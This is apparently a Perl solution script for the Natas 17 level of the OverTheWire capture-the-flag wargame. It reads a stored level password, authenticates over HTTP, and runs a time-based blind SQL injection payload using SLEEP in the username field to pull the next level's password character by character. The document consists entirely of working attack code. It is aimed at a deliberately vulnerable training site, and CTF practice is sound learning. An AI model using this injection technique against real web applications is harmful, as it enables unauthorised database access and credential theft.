use strict;
use warnings;
use HTTP::Tiny;
use Path::Tiny;
use MIME::Base64 'encode_base64';

my $num = 16;
my $user = "natas" . ($num + 1);
my @lines = path('../Pwds.txt')->lines_utf8;
my $pass = $lines[$num];

my $url = "http://$user.natas.labs.overthewire.org/";
my $http = HTTP::Tiny->new;
my %headers = (
    'Authorization' => 'Basic ' . encode_base64("$user:$pass", ''),
    'Content-Type' => 'application/x-www-form-urlencoded',
);

sub req {
    my ($username) = @_;
    
    my $response = $http->post($url, {
        headers => \%headers,
        content => "username=$username"
    });

    unless ($response->{success}) {
        die "Failed: $response->{status} $response->{content}\n";
    } 

    return $response->{content};
}

sub responsetime {
    my ($username) = @_;
    
    my $start_time = time();
    my $response = req $username;
    my $end_time = time();

    return $end_time - $start_time;
}

my $chars = join('', 'A'..'Z', 'a'..'z', '0'..'9');
my $natas18_pass = '';
my $sleep = 5;

while (length $natas18_pass < 32) {
    for my $ch (split //, $chars) {
       my $candidate = "$natas18_pass$ch";
       print "Attempting password: $candidate\n";
       my $query = "natas18\"AND BINARY password LIKE \"$candidate%\"AND SLEEP($sleep)#";

       if (responsetime($query) > 3) {
           $natas18_pass = $candidate;
           print "$natas18_pass\n";
           last;
       }
   }
}
